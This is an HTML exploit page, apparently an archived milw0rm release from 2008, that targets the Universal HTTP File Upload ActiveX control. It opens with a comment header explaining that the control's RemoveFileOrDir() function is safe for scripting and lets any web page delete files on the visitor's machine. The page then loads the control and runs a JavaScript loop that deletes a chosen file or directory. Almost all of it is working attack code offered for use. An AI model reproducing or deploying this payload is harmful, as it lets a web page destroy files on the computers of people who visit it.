@@ -1,0 +1,50 @@
+<HTML>
+<!--
+
+        - Univeral HTTP File Upload (UUploaderSvrD.dll - v6.0.0.35) Remote File Deletetion Exploit -
+       
+                Author: t0pP8uZz
+                Homepage: h4ck-y0u.org / milw0rm.com
+                Description: ActiveX Remote File Deletetion
+               
+                Report: Tested on Microsoft Windows XP Pro (SP2 ) Internet Explorer 7 Fully Patched
+               
+                ActiveX: http://www.uploadactivex.com/Download_versal_file_upload_activeX_control.htm
+       
+                The Following Material Is For Educational Purposes Only - I will not be held responsable for any illegal actions.
+       
+                InternetExplorer can Initialise this ActiveX control, And take advantage of its functions.
+                The RemoveFileOrDir() function is insecure, and can delete a file of any choice. The main secuirty threat of this ActiveX control is it being Safe Scripting for InternetExplorer.
+               
+                Below you will find some code which makes use of the developers error and an attack can specify a file to delete. ie(C:/boot.ini)
+               
+                Vendor: Not Reported
+
+-->
+<OBJECT ID="fileup" CLASSID="CLSID:04FD48E6-0712-4937-B09E-F3D285B11D82">Could Not Load ActiveX Control.</OBJECT>
+
+<script language="javascript">
+/* - Univeral HTTP File Upload (UUploaderSvrD.dll - v6.0.0.35) Remote File Deletetion Exploit - */
+/*                                                      Javascript Code By t0pP8uZz                                                       */
+
+var x = "C:/tmp.txt"; /* Full Path To File To Delete  OR directory*/
+
+var del = true;
+var c   = 1;
+
+while(del) {
+
+        try {
+                fileup.RemoveFileOrDir(x, c);
+                del = false;
+                alert("File Deleted!");
+        } catch(e){ c++; }
+}
+
+</script>
+
+</HTML>
+
+# milw0rm.com [2008-03-18]
+
+
